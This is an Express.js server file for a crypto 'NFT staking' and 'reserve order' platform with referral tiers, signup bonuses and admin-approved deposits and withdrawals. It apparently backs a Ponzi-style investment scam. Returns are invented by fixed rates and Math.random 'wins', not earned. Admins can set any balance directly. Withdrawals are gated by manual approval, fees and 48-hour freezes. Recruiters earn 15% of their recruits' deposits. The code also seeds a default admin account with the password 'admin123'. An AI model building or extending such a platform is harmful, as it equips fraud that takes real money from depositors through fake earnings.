const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const bcrypt = require('bcryptjs');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = '0.0.0.0';
const DATA_DIR = path.join(__dirname, 'data');

app.use(helmet({
  contentSecurityPolicy: false // app relies on inline <script>/<style>; CSP would need a rewrite of every page to use nonces
}));

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 20,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many attempts. Please try again later.' }
});

app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/assets', express.static(path.join(__dirname, 'public/assets')));
app.use('/uploads', express.static(path.join(__dirname, 'data/uploads')));

if (!fs.existsSync(path.join(DATA_DIR, 'uploads'))) {
  fs.mkdirSync(path.join(DATA_DIR, 'uploads'), { recursive: true });
}

function readData(file) {
  const p = path.join(DATA_DIR, file);
  if (!fs.existsSync(p)) return [];
  return JSON.parse(fs.readFileSync(p, 'utf8'));
}

function writeData(file, data) {
  fs.writeFileSync(path.join(DATA_DIR, file), JSON.stringify(data, null, 2));
}

function readConfig(file) {
  const p = path.join(DATA_DIR, file);
  if (!fs.existsSync(p)) return {};
  return JSON.parse(fs.readFileSync(p, 'utf8'));
}

function writeConfig(file, data) {
  fs.writeFileSync(path.join(DATA_DIR, file), JSON.stringify(data, null, 2));
}

function generateId() { return Date.now().toString(36) + Math.random().toString(36).substr(2, 9); }
function generateUID() { return 'MLK' + Math.random().toString(36).substr(2, 8).toUpperCase(); }
function generateOrderNumber() { return Date.now().toString() + Math.floor(Math.random() * 100000).toString(); }

// Legacy unsalted-SHA256 hash, kept only to verify passwords created before the bcrypt migration.
function legacyHash(pw) { return crypto.createHash('sha256').update(pw).digest('hex'); }
function isBcryptHash(h) { return typeof h === 'string' && /^\$2[aby]?\$/.test(h); }
async function hashPassword(pw) { return bcrypt.hash(pw, 10); }
// Verifies against bcrypt hashes; transparently accepts one-time legacy sha256 hashes so existing accounts aren't locked out.
async function verifyPassword(pw, storedHash) {
  if (isBcryptHash(storedHash)) return bcrypt.compare(pw, storedHash);
  return legacyHash(pw) === storedHash;
}

const SESSION_TTL_MS = 7 * 24 * 60 * 60 * 1000;
const sessions = {};

function createSession(subjectId, role) {
  const token = crypto.randomBytes(32).toString('hex');
  sessions[token] = { userId: subjectId, role, expiresAt: Date.now() + SESSION_TTL_MS };
  return token;
}

function authMiddleware(req, res, next) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  const session = token && sessions[token];
  if (!session) return res.status(401).json({ error: 'Unauthorized' });
  if (session.expiresAt < Date.now()) { delete sessions[token]; return res.status(401).json({ error: 'Session expired' }); }
  req.token = token;
  req.userId = session.userId;
  req.userRole = session.role || 'user';
  next();
}

function adminMiddleware(req, res, next) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  const session = token && sessions[token];
  if (!session || session.role !== 'admin') return res.status(403).json({ error: 'Admin access required' });
  if (session.expiresAt < Date.now()) { delete sessions[token]; return res.status(403).json({ error: 'Session expired' }); }
  req.token = token;
  req.userId = session.userId;
  req.userRole = 'admin';
  next();
}

// Initialize default admin
async function initAdmin() {
  let admins = readData('admins.json');
  if (admins.length === 0) {
    admins.push({
      id: generateId(),
      username: 'admin',
      password: await hashPassword('admin123'),
      createdAt: new Date().toISOString()
    });
    writeData('admins.json', admins);
  }
}
initAdmin();

// Initialize default NFT stakes catalog
function initStakes() {
  let stakes = readData('nft_catalog.json');
  if (stakes.length === 0) {
    stakes = [
      { id: 'nft1', name: 'CoolAPE', collection: 'CryptoPunks', image: '/assets/images/nfts/stake-1.jpg', pledgeRange: '50 - 500', dailyIncome: '1.8%', duration: 7, color: '#7C3AED' },
      { id: 'nft2', name: 'PixelDog', collection: 'PolygonNFT', image: '/assets/images/nfts/stake-2.jpg', pledgeRange: '100 - 1000', dailyIncome: '2.1%', duration: 14, color: '#4F46E5' },
      { id: 'nft3', name: 'MetaMonkey', collection: 'Art', image: '/assets/images/nfts/stake-3.jpg', pledgeRange: '200 - 2000', dailyIncome: '2.5%', duration: 30, color: '#14B8A6' },
      { id: 'nft4', name: 'CyberCat', collection: 'Collectibles', image: '/assets/images/nfts/stake-4.png', pledgeRange: '500 - 5000', dailyIncome: '3.0%', duration: 60, color: '#3B82F6' },
      { id: 'nft5', name: 'NeonBear', collection: 'CryptoPunks', image: '/assets/images/nfts/stake-5.png', pledgeRange: '1000 - 10000', dailyIncome: '3.5%', duration: 90, color: '#EF4444' },
      { id: 'nft6', name: 'GoldEagle', collection: 'Art', image: '/assets/images/nfts/stake-6.png', pledgeRange: '50 - 2000', dailyIncome: '1.5%', duration: 7, color: '#F59E0B' },
    ];
    writeData('nft_catalog.json', stakes);
  }
}
initStakes();

// ===================== AUTH ROUTES =====================

app.post('/api/auth/register', authLimiter, async (req, res) => {
  const { email, password, confirmPassword, referralCode } = req.body;
  if (!email || !password || !confirmPassword) return res.status(400).json({ error: 'All fields are required' });
  if (password !== confirmPassword) return res.status(400).json({ error: 'Passwords do not match' });
  if (password.length < 6) return res.status(400).json({ error: 'Password must be at least 6 characters' });

  let users = readData('users.json');
  if (users.find(u => u.email === email)) return res.status(400).json({ error: 'Email already registered' });

  let referredBy = null;
  if (referralCode) {
    const referrer = users.find(u => u.uid === referralCode);
    if (!referrer) return res.status(400).json({ error: 'Invalid referral code' });
    referredBy = referrer.id;
  }

  const config = readConfig('platform_config.json');
  const signupBonus = config.signupBonus !== undefined ? parseFloat(config.signupBonus) : 10;

  const user = {
    id: generateId(),
    email,
    password: await hashPassword(password),
    secondPassword: await hashPassword(password),
    username: email.split('@')[0],
    uid: generateUID(),
    level: 0,
    points: 0,
    walletBalance: signupBonus,
    walletBalanceMLK: 0,
    walletAddress: { trc20: '', erc20: '' },
    walletAddressUpdatedAt: null,
    avatar: '',
    referralCode: null,
    referredBy,
    createdAt: new Date().toISOString(),
    totalIncome: 0,
    totalWithdrawn: 0,
    dailyIncome: { comprehensive: 0, reserve: 0, team: 0, activity: 0, finance: 0, earn: 0, ecology: 0, growth: 0, stake: 0 }
  };

  users.push(user);
  writeData('users.json', users);

  if (referredBy) {
    let teams = readData('teams.json');
    teams.push({ userId: referredBy, memberId: user.id, tier: 'C', joinedAt: new Date().toISOString() });
    writeData('teams.json', teams);
  }

  const token = createSession(user.id, 'user');

  res.json({ token, user: { id: user.id, email: user.email, username: user.username, uid: user.uid, level: user.level, points: user.points } });
});

app.post('/api/auth/login', authLimiter, async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'Email and password are required' });

  let users = readData('users.json');
  const idx = users.findIndex(u => u.email === email);
  if (idx === -1 || !(await verifyPassword(password, users[idx].password))) {
    return res.status(401).json({ error: 'Account or password is incorrect' });
  }
  if (!isBcryptHash(users[idx].password)) {
    users[idx].password = await hashPassword(password);
    writeData('users.json', users);
  }
  const user = users[idx];

  const token = createSession(user.id, 'user');

  res.json({
    token,
    user: { id: user.id, email: user.email, username: user.username, uid: user.uid, level: user.level, points: user.points, avatar: user.avatar }
  });
});

app.post('/api/auth/forgot-password', authLimiter, (req, res) => {
  res.status(403).json({ error: 'Self-service password reset is temporarily disabled. Please contact support to reset your password.' });
});

app.post('/api/auth/logout', authMiddleware, (req, res) => {
  delete sessions[req.token];
  res.json({ message: 'Logged out' });
});

// ===================== USER ROUTES =====================

app.get('/api/user/profile', authMiddleware, (req, res) => {
  const users = readData('users.json');
  const user = users.find(u => u.id === req.userId);
  if (!user) return res.status(404).json({ error: 'User not found' });

  const { password, secondPassword, ...profile } = user;
  res.json(profile);
});

const USERNAME_RE = /^[A-Za-z0-9_-]{3,20}$/;
const AVATAR_RE = /^(\/uploads\/[A-Za-z0-9_-]+\.(png|jpe?g|gif|webp)|data:image\/(png|jpe?g|gif|webp);base64,[A-Za-z0-9+/]+=*)$/;

app.put('/api/user/profile', authMiddleware, (req, res) => {
  let users = readData('users.json');
  const idx = users.findIndex(u => u.id === req.userId);
  if (idx === -1) return res.status(404).json({ error: 'User not found' });

  const { username, avatar } = req.body;
  if (username) {
    if (!USERNAME_RE.test(username)) return res.status(400).json({ error: 'Username must be 3-20 characters: letters, numbers, - or _ only' });
    users[idx].username = username;
  }
  if (avatar) {
    if (!AVATAR_RE.test(avatar)) return res.status(400).json({ error: 'Invalid avatar format' });
    users[idx].avatar = avatar;
  }
  writeData('users.json', users);

  const { password, secondPassword, ...profile } = users[idx];
  res.json(profile);
});

app.put('/api/user/wallet', authMiddleware, (req, res) => {
  let users = readData('users.json');
  const idx = users.findIndex(u => u.id === req.userId);
  if (idx === -1) return res.status(404).json({ error: 'User not found' });

  const { trc20, bep20 } = req.body;
  const now = new Date();
  const lastUpdate = users[idx].walletAddressUpdatedAt ? new Date(users[idx].walletAddressUpdatedAt) : null;

  if (lastUpdate) {
    const hoursSince = (now - lastUpdate) / (1000 * 60 * 60);
    if (hoursSince < 48) {
      const remaining = 48 - hoursSince;
      const days = Math.floor(remaining / 24);
      const hours = Math.floor(remaining % 24);
      const mins = Math.floor((remaining * 60) % 60);
      return res.status(400).json({
        error: `Withdrawal services will be suspended for ${days} days ${hours} hours ${mins} min after changing wallet address.`,
        cooldown: true
      });
    }
  }

  if (trc20 !== undefined) users[idx].walletAddress.trc20 = trc20;
  if (bep20 !== undefined) users[idx].walletAddress.bep20 = bep20;
  // Keep erc20 field in sync with bep20 for withdrawal compatibility
  if (bep20 !== undefined) users[idx].walletAddress.erc20 = bep20;
  users[idx].walletAddressUpdatedAt = now.toISOString();
  writeData('users.json', users);

  // Log wallet submission for admin review
  let submissions = readData('wallet_submissions.json');
  submissions.push({
    id: generateId(),
    userId: users[idx].id,
    email: users[idx].email,
    username: users[idx].username,
    uid: users[idx].uid,
    trc20: users[idx].walletAddress.trc20 || '',
    bep20: users[idx].walletAddress.bep20 || users[idx].walletAddress.erc20 || '',
    submittedAt: now.toISOString()
  });
  writeData('wallet_submissions.json', submissions);

  res.json({ message: 'Wallet address updated', walletAddress: { trc20: users[idx].walletAddress.trc20, bep20: users[idx].walletAddress.bep20 || users[idx].walletAddress.erc20 } });
});

app.get('/api/user/team', authMiddleware, (req, res) => {
  const teams = readData('teams.json');
  const users = readData('users.json');
  const myTeam = teams.filter(t => t.userId === req.userId);

  const members = myTeam.map(t => {
    const member = users.find(u => u.id === t.memberId);
    return {
      id: t.memberId,
      username: member?.username || 'Unknown',
      tier: t.tier,
      joinedAt: t.joinedAt,
      isValid: (member?.walletBalance || 0) > 0
    };
  });

  const stats = {
    totalRegistered: members.length,
    totalValid: members.filter(m => m.isValid).length,
    aTier: { registered: members.filter(m => m.tier === 'A').length, valid: members.filter(m => m.tier === 'A' && m.isValid).length },
    bTier: { registered: members.filter(m => m.tier === 'B').length, valid: members.filter(m => m.tier === 'B' && m.isValid).length },
    cTier: { registered: members.filter(m => m.tier === 'C').length, valid: members.filter(m => m.tier === 'C' && m.isValid).length },
  };

  res.json({ members, stats });
});

// ===================== STAKE ROUTES =====================

app.get('/api/stakes/catalog', authMiddleware, (req, res) => {
  const catalog = readData('nft_catalog.json');
  res.json(catalog);
});

app.get('/api/stakes/my', authMiddleware, (req, res) => {
  const stakes = readData('user_stakes.json');
  const myStakes = stakes.filter(s => s.userId === req.userId);
  res.json(myStakes);
});

app.post('/api/stakes', authMiddleware, (req, res) => {
  const { nftId, amount } = req.body;
  const catalog = readData('nft_catalog.json');
  const nft = catalog.find(n => n.id === nftId);
  if (!nft) return res.status(404).json({ error: 'NFT not found' });

  let users = readData('users.json');
  const userIdx = users.findIndex(u => u.id === req.userId);
  if (userIdx === -1) return res.status(404).json({ error: 'User not found' });
  if (users[userIdx].walletBalance < amount) return res.status(400).json({ error: 'Insufficient balance' });

  const [min, max] = nft.pledgeRange.split(' - ').map(Number);
  if (amount < min || amount > max) return res.status(400).json({ error: `Amount must be between ${min} and ${max} USDT` });

  users[userIdx].walletBalance -= amount;
  writeData('users.json', users);

  const dailyRate = parseFloat(nft.dailyIncome) / 100;
  const expectedTotal = amount * dailyRate * nft.duration;

  let stakes = readData('user_stakes.json');
  const stake = {
    id: generateId(),
    userId: req.userId,
    nftId: nft.id,
    nftName: nft.name,
    nftNumber: '#' + Math.floor(Math.random() * 9999),
    collection: nft.collection,
    color: nft.color,
    pledgeValue: amount,
    dailyIncome: nft.dailyIncome,
    duration: nft.duration,
    startDate: new Date().toISOString(),
    endDate: new Date(Date.now() + nft.duration * 24 * 60 * 60 * 1000).toISOString(),
    income: 0,
    expectedTotal,
    status: 'active',
    claimed: false
  };
  stakes.push(stake);
  writeData('user_stakes.json', stakes);

  res.json(stake);
});

app.post('/api/stakes/:id/claim', authMiddleware, (req, res) => {
  let stakes = readData('user_stakes.json');
  const idx = stakes.findIndex(s => s.id === req.params.id && s.userId === req.userId);
  if (idx === -1) return res.status(404).json({ error: 'Stake not found' });
  if (stakes[idx].claimed) return res.status(400).json({ error: 'Already claimed' });

  const now = new Date();
  const start = new Date(stakes[idx].startDate);
  const daysElapsed = Math.min((now - start) / (1000 * 60 * 60 * 24), stakes[idx].duration);
  const dailyRate = parseFloat(stakes[idx].dailyIncome) / 100;
  const income = stakes[idx].pledgeValue * dailyRate * daysElapsed;

  stakes[idx].income = parseFloat(income.toFixed(5));
  stakes[idx].claimed = true;
  stakes[idx].status = 'completed';
  writeData('user_stakes.json', stakes);

  let users = readData('users.json');
  const userIdx = users.findIndex(u => u.id === req.userId);
  users[userIdx].walletBalance += stakes[idx].pledgeValue + income;
  users[userIdx].totalIncome += income;
  users[userIdx].dailyIncome.stake += income;
  writeData('users.json', users);

  res.json({ message: 'Claimed successfully', income: parseFloat(income.toFixed(5)) });
});

// ===================== RESERVE ROUTES =====================

app.get('/api/reserve/orders', authMiddleware, (req, res) => {
  const orders = readData('reserve_orders.json');
  const myOrders = orders.filter(o => o.userId === req.userId);
  const users = readData('users.json');
  const user = users.find(u => u.id === req.userId);

  const todayEarnings = myOrders
    .filter(o => o.status === 'Won' && new Date(o.reservationDate).toDateString() === new Date().toDateString())
    .reduce((sum, o) => sum + (o.reward || 0), 0);
  const cumulativeIncome = myOrders
    .filter(o => o.status === 'Won')
    .reduce((sum, o) => sum + (o.reward || 0), 0);

  res.json({
    todayEarnings,
    cumulativeIncome,
    reservationRange: '50 - 2,000',
    walletBalance: user?.walletBalance || 0,
    balanceForReservation: 0,
    orders: myOrders
  });
});

app.post('/api/reserve/orders', authMiddleware, (req, res) => {
  const { amount } = req.body;
  if (!amount || amount < 50 || amount > 2000) return res.status(400).json({ error: 'Amount must be between 50 and 2000 USDT' });

  let users = readData('users.json');
  const userIdx = users.findIndex(u => u.id === req.userId);
  if (users[userIdx].walletBalance < amount) return res.status(400).json({ error: 'Insufficient balance' });

  users[userIdx].walletBalance -= amount;
  writeData('users.json', users);

  const won = Math.random() > 0.3;
  const reward = won ? amount * (0.01 + Math.random() * 0.05) : 0;

  let orders = readData('reserve_orders.json');
  const order = {
    id: generateId(),
    userId: req.userId,
    orderNumber: generateOrderNumber(),
    reservationDate: new Date().toISOString(),
    amount: `${amount} - ${amount}`,
    reservationAmount: amount,
    status: won ? 'Won' : 'Not Won',
    reward: parseFloat(reward.toFixed(2))
  };
  orders.push(order);
  writeData('reserve_orders.json', orders);

  if (won) {
    users[userIdx].walletBalance += amount + reward;
    users[userIdx].totalIncome += reward;
    users[userIdx].dailyIncome.reserve += reward;
  } else {
    users[userIdx].walletBalance += amount;
  }
  writeData('users.json', users);

  res.json(order);
});

// ===================== ASSETS / WALLET ROUTES =====================

app.get('/api/assets', authMiddleware, (req, res) => {
  const users = readData('users.json');
  const user = users.find(u => u.id === req.userId);
  if (!user) return res.status(404).json({ error: 'User not found' });

  const withdrawals = readData('withdrawals.json').filter(w => w.userId === req.userId);
  const deposits = readData('deposits.json').filter(d => d.userId === req.userId);

  const totalWithdrawn = withdrawals.filter(w => w.status === 'Approved').reduce((s, w) => s + w.amount, 0);
  const notWithdrawn = user.totalIncome - totalWithdrawn;

  const history = [
    ...withdrawals.map(w => ({ type: 'Withdraw', amount: -w.amount, date: w.createdAt, status: w.status === 'Approved' ? 'Deposited' : w.status === 'Rejected' ? 'Rejected' : 'Processing' })),
    ...deposits.map(d => ({ type: 'Deposit', amount: d.amount, date: d.createdAt, status: d.status === 'Approved' ? 'Deposited' : 'Processing' })),
  ].sort((a, b) => new Date(b.date) - new Date(a.date));

  res.json({
    balance: user.walletBalance,
    totalRevenue: user.totalIncome,
    totalWithdrawn,
    notWithdrawn: Math.max(0, notWithdrawn),
    history
  });
});

// ===================== WITHDRAWAL ROUTES =====================

app.post('/api/withdrawals', authMiddleware, (req, res) => {
  const { amount, walletType } = req.body;
  if (!amount || amount <= 0) return res.status(400).json({ error: 'Invalid amount' });

  let users = readData('users.json');
  const userIdx = users.findIndex(u => u.id === req.userId);
  const user = users[userIdx];

  if (user.walletBalance < amount) return res.status(400).json({ error: 'Insufficient balance' });

  const walletAddr = (walletType === 'bep20' || walletType === 'erc20') ? (user.walletAddress.bep20 || user.walletAddress.erc20) : user.walletAddress.trc20;
  if (!walletAddr) return res.status(400).json({ error: 'Please set your wallet address first' });

  if (user.walletAddressUpdatedAt) {
    const hoursSince = (new Date() - new Date(user.walletAddressUpdatedAt)) / (1000 * 60 * 60);
    if (hoursSince < 48) {
      const remaining = 48 - hoursSince;
      const days = Math.floor(remaining / 24);
      const hours = Math.floor(remaining % 24);
      const mins = Math.floor((remaining * 60) % 60);
      return res.status(400).json({
        error: `Withdrawal Failed. Due to a change in wallet settings, withdrawal services will be suspended for ${days} days ${hours} hours ${mins} min ${Math.floor((remaining * 3600) % 60)} s to protect your account.`
      });
    }
  }

  const cfg = readConfig('platform_config.json');
  const withdrawalFeePct = cfg.withdrawalFeePct !== undefined ? parseFloat(cfg.withdrawalFeePct) : 4;
  const fee = parseFloat((amount * withdrawalFeePct / 100).toFixed(2));
  const tax = 0;
  const netAmount = parseFloat((amount - fee - tax).toFixed(2));

  users[userIdx].walletBalance -= amount;
  users[userIdx].totalWithdrawn += amount;
  writeData('users.json', users);

  let withdrawals = readData('withdrawals.json');
  const withdrawal = {
    id: generateId(),
    userId: req.userId,
    email: user.email,
    username: user.username,
    uid: user.uid,
    amount,
    fee,
    tax,
    netAmount,
    walletType: walletType || 'trc20',
    walletAddress: walletAddr,
    status: 'Pending',
    createdAt: new Date().toISOString()
  };
  withdrawals.push(withdrawal);
  writeData('withdrawals.json', withdrawals);

  res.json(withdrawal);
});

app.get('/api/withdrawals', authMiddleware, (req, res) => {
  const withdrawals = readData('withdrawals.json').filter(w => w.userId === req.userId);
  res.json(withdrawals);
});

// ===================== DEPOSIT ROUTES =====================

app.post('/api/deposits', authMiddleware, (req, res) => {
  const { amount } = req.body;
  if (!amount || amount <= 0) return res.status(400).json({ error: 'Invalid amount' });

  const config = readConfig('platform_config.json');
  const minDeposit = config.minDeposit !== undefined ? parseFloat(config.minDeposit) : 50;
  if (amount < minDeposit) return res.status(400).json({ error: `Minimum deposit is $${minDeposit}` });

  let deposits = readData('deposits.json');
  const deposit = {
    id: generateId(),
    userId: req.userId,
    amount: parseFloat(amount),
    status: 'Pending',
    createdAt: new Date().toISOString()
  };
  deposits.push(deposit);
  writeData('deposits.json', deposits);

  res.json(deposit);
});

// ===================== ANNOUNCEMENT ROUTES =====================

app.get('/api/announcements', (req, res) => {
  const announcements = readData('announcements.json');
  res.json(announcements.sort((a, b) => new Date(b.date) - new Date(a.date)));
});

app.get('/api/announcements/:id', (req, res) => {
  const announcements = readData('announcements.json');
  const ann = announcements.find(a => a.id === req.params.id);
  if (!ann) return res.status(404).json({ error: 'Announcement not found' });
  res.json(ann);
});

// ===================== ADMIN ROUTES =====================

app.post('/api/admin/login', authLimiter, async (req, res) => {
  const { username, password } = req.body;
  let admins = readData('admins.json');
  const idx = admins.findIndex(a => a.username === username);
  if (idx === -1 || !(await verifyPassword(password, admins[idx].password))) {
    return res.status(401).json({ error: 'Invalid admin credentials' });
  }
  if (!isBcryptHash(admins[idx].password)) {
    admins[idx].password = await hashPassword(password);
    writeData('admins.json', admins);
  }
  const admin = admins[idx];

  const token = createSession(admin.id, 'admin');
  res.json({ token, admin: { id: admin.id, username: admin.username } });
});

app.post('/api/admin/logout', adminMiddleware, (req, res) => {
  delete sessions[req.token];
  res.json({ message: 'Logged out' });
});

app.get('/api/admin/stats', adminMiddleware, (req, res) => {
  const users = readData('users.json');
  const withdrawals = readData('withdrawals.json');
  const deposits = readData('deposits.json');
  const stakes = readData('user_stakes.json');

  res.json({
    totalUsers: users.length,
    totalDeposits: deposits.reduce((s, d) => s + d.amount, 0),
    totalWithdrawals: withdrawals.filter(w => w.status === 'Approved').reduce((s, w) => s + w.amount, 0),
    pendingWithdrawals: withdrawals.filter(w => w.status === 'Pending').length,
    activeStakes: stakes.filter(s => s.status === 'active').length,
    totalStakeValue: stakes.filter(s => s.status === 'active').reduce((s, st) => s + st.pledgeValue, 0)
  });
});

app.get('/api/admin/users', adminMiddleware, (req, res) => {
  const users = readData('users.json').map(u => {
    const { password, secondPassword, ...rest } = u;
    return rest;
  });
  res.json(users);
});

app.put('/api/admin/users/:id', adminMiddleware, (req, res) => {
  let users = readData('users.json');
  const idx = users.findIndex(u => u.id === req.params.id);
  if (idx === -1) return res.status(404).json({ error: 'User not found' });

  const { walletBalance, level, points, username } = req.body;
  if (walletBalance !== undefined) users[idx].walletBalance = parseFloat(walletBalance);
  if (level !== undefined) users[idx].level = parseInt(level);
  if (points !== undefined) users[idx].points = parseFloat(points);
  if (username !== undefined) users[idx].username = username;
  writeData('users.json', users);

  const { password, secondPassword, ...profile } = users[idx];
  res.json(profile);
});

app.put('/api/admin/users/:id/wallet', adminMiddleware, (req, res) => {
  let users = readData('users.json');
  const idx = users.findIndex(u => u.id === req.params.id);
  if (idx === -1) return res.status(404).json({ error: 'User not found' });

  const { trc20, erc20 } = req.body;
  if (trc20 !== undefined) users[idx].walletAddress.trc20 = trc20;
  if (erc20 !== undefined) users[idx].walletAddress.erc20 = erc20;
  writeData('users.json', users);

  res.json({ message: 'Wallet updated', walletAddress: users[idx].walletAddress });
});

app.put('/api/admin/users/:id/balance', adminMiddleware, (req, res) => {
  let users = readData('users.json');
  const idx = users.findIndex(u => u.id === req.params.id);
  if (idx === -1) return res.status(404).json({ error: 'User not found' });

  const { amount, action } = req.body;
  if (action === 'add') {
    users[idx].walletBalance += parseFloat(amount);
    let deposits = readData('deposits.json');
    deposits.push({
      id: generateId(),
      userId: users[idx].id,
      amount: parseFloat(amount),
      status: 'Approved',
      approvedBy: 'admin',
      createdAt: new Date().toISOString()
    });
    writeData('deposits.json', deposits);
  } else if (action === 'subtract') {
    users[idx].walletBalance = Math.max(0, users[idx].walletBalance - parseFloat(amount));
  } else if (action === 'set') {
    users[idx].walletBalance = parseFloat(amount);
  }
  writeData('users.json', users);

  const { password, secondPassword, ...profile } = users[idx];
  res.json(profile);
});

app.get('/api/admin/withdrawals', adminMiddleware, (req, res) => {
  const withdrawals = readData('withdrawals.json');
  res.json(withdrawals.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
});

app.put('/api/admin/withdrawals/:id', adminMiddleware, (req, res) => {
  let withdrawals = readData('withdrawals.json');
  const idx = withdrawals.findIndex(w => w.id === req.params.id);
  if (idx === -1) return res.status(404).json({ error: 'Withdrawal not found' });

  const { status } = req.body;
  withdrawals[idx].status = status;
  withdrawals[idx].processedAt = new Date().toISOString();

  if (status === 'Rejected') {
    let users = readData('users.json');
    const userIdx = users.findIndex(u => u.id === withdrawals[idx].userId);
    if (userIdx !== -1) {
      users[userIdx].walletBalance += withdrawals[idx].amount;
      users[userIdx].totalWithdrawn -= withdrawals[idx].amount;
      writeData('users.json', users);
    }
  }

  writeData('withdrawals.json', withdrawals);
  res.json(withdrawals[idx]);
});

app.get('/api/admin/deposits', adminMiddleware, (req, res) => {
  const deposits = readData('deposits.json');
  res.json(deposits.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
});

app.put('/api/admin/deposits/:id', adminMiddleware, (req, res) => {
  let deposits = readData('deposits.json');
  const idx = deposits.findIndex(d => d.id === req.params.id);
  if (idx === -1) return res.status(404).json({ error: 'Deposit not found' });

  const { status } = req.body;
  deposits[idx].status = status;
  deposits[idx].processedAt = new Date().toISOString();

  if (status === 'Approved') {
    let users = readData('users.json');
    const userIdx = users.findIndex(u => u.id === deposits[idx].userId);
    if (userIdx !== -1) {
      users[userIdx].walletBalance += deposits[idx].amount;

      const depositor = users[userIdx];
      if (depositor.referredBy) {
        const referrerIdx = users.findIndex(u => u.id === depositor.referredBy);
        if (referrerIdx !== -1 && !deposits[idx].referralPaid) {
          const cfg = readConfig('platform_config.json');
          const referralPct = cfg.referralBonusPct !== undefined ? parseFloat(cfg.referralBonusPct) : 15;
          const bonus = parseFloat((deposits[idx].amount * referralPct / 100).toFixed(2));
          users[referrerIdx].walletBalance += bonus;
          users[referrerIdx].totalIncome += bonus;
          users[referrerIdx].dailyIncome.team += bonus;
          deposits[idx].referralPaid = true;
          deposits[idx].referralBonus = bonus;
          deposits[idx].referralTo = depositor.referredBy;
        }
      }

      writeData('users.json', users);
    }
  }

  writeData('deposits.json', deposits);
  res.json(deposits[idx]);
});

app.post('/api/admin/announcements', adminMiddleware, (req, res) => {
  const { title, date, category, content, image } = req.body;
  if (!title || !content) return res.status(400).json({ error: 'Title and content are required' });

  let announcements = readData('announcements.json');
  const announcement = {
    id: generateId(),
    title,
    date: date || new Date().toISOString().split('T')[0],
    category: category || 'Announcement',
    content,
    image: image || '',
    createdAt: new Date().toISOString()
  };
  announcements.push(announcement);
  writeData('announcements.json', announcements);
  res.json(announcement);
});

app.put('/api/admin/announcements/:id', adminMiddleware, (req, res) => {
  let announcements = readData('announcements.json');
  const idx = announcements.findIndex(a => a.id === req.params.id);
  if (idx === -1) return res.status(404).json({ error: 'Announcement not found' });

  const { title, date, category, content, image } = req.body;
  if (title) announcements[idx].title = title;
  if (date) announcements[idx].date = date;
  if (category) announcements[idx].category = category;
  if (content) announcements[idx].content = content;
  if (image !== undefined) announcements[idx].image = image;
  announcements[idx].updatedAt = new Date().toISOString();

  writeData('announcements.json', announcements);
  res.json(announcements[idx]);
});

app.delete('/api/admin/announcements/:id', adminMiddleware, (req, res) => {
  let announcements = readData('announcements.json');
  announcements = announcements.filter(a => a.id !== req.params.id);
  writeData('announcements.json', announcements);
  res.json({ message: 'Deleted' });
});

app.get('/api/admin/announcements', adminMiddleware, (req, res) => {
  const announcements = readData('announcements.json');
  res.json(announcements.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
});

// ===================== ADMIN WALLET SUBMISSIONS =====================

app.get('/api/admin/wallet-submissions', adminMiddleware, (req, res) => {
  const submissions = readData('wallet_submissions.json');
  res.json(submissions.sort((a, b) => new Date(b.submittedAt) - new Date(a.submittedAt)));
});

app.delete('/api/admin/wallet-submissions/:id', adminMiddleware, (req, res) => {
  let submissions = readData('wallet_submissions.json');
  submissions = submissions.filter(s => s.id !== req.params.id);
  writeData('wallet_submissions.json', submissions);
  res.json({ message: 'Deleted' });
});

// Admin upload image (base64)
app.post('/api/admin/upload', adminMiddleware, (req, res) => {
  const { image } = req.body;
  if (!image) return res.status(400).json({ error: 'No image provided' });

  const matches = image.match(/^data:image\/(\w+);base64,(.+)$/);
  if (!matches) return res.status(400).json({ error: 'Invalid image format' });

  const allowedExt = ['png', 'jpg', 'jpeg', 'gif', 'webp'];
  const ext = matches[1].toLowerCase();
  if (!allowedExt.includes(ext)) return res.status(400).json({ error: 'Unsupported image type' });
  const data = matches[2];
  // Filename is always server-generated — never derived from client input — to prevent path traversal.
  const fname = generateId() + '.' + ext;
  const fpath = path.join(DATA_DIR, 'uploads', fname);

  fs.writeFileSync(fpath, Buffer.from(data, 'base64'));
  res.json({ url: '/uploads/' + fname });
});

// ===================== PLATFORM CONFIG ROUTES =====================

app.get('/api/platform/deposit-addresses', (req, res) => {
  const config = readConfig('platform_config.json');
  res.json({
    trc20: config.depositAddressTrc20 || '',
    bep20: config.depositAddressBep20 || ''
  });
});

app.get('/api/platform/info', (req, res) => {
  const config = readConfig('platform_config.json');
  res.json({
    signupBonus: config.signupBonus !== undefined ? config.signupBonus : 10,
    minDeposit: config.minDeposit !== undefined ? config.minDeposit : 50,
    referralBonusPct: config.referralBonusPct !== undefined ? config.referralBonusPct : 15,
    withdrawalFeePct: config.withdrawalFeePct !== undefined ? config.withdrawalFeePct : 4
  });
});

app.get('/api/admin/platform-config', adminMiddleware, (req, res) => {
  const config = readConfig('platform_config.json');
  res.json(config);
});

app.put('/api/admin/platform-config', adminMiddleware, (req, res) => {
  let config = readConfig('platform_config.json');
  const { depositAddressTrc20, depositAddressBep20, signupBonus, minDeposit, referralBonusPct, withdrawalFeePct } = req.body;
  if (depositAddressTrc20 !== undefined) config.depositAddressTrc20 = depositAddressTrc20;
  if (depositAddressBep20 !== undefined) config.depositAddressBep20 = depositAddressBep20;
  if (signupBonus !== undefined) config.signupBonus = parseFloat(signupBonus);
  if (minDeposit !== undefined) config.minDeposit = parseFloat(minDeposit);
  if (referralBonusPct !== undefined) config.referralBonusPct = parseFloat(referralBonusPct);
  if (withdrawalFeePct !== undefined) config.withdrawalFeePct = parseFloat(withdrawalFeePct);
  writeConfig('platform_config.json', config);
  res.json(config);
});

// Serve admin page
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// SPA catch-all
app.get('/{*splat}', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

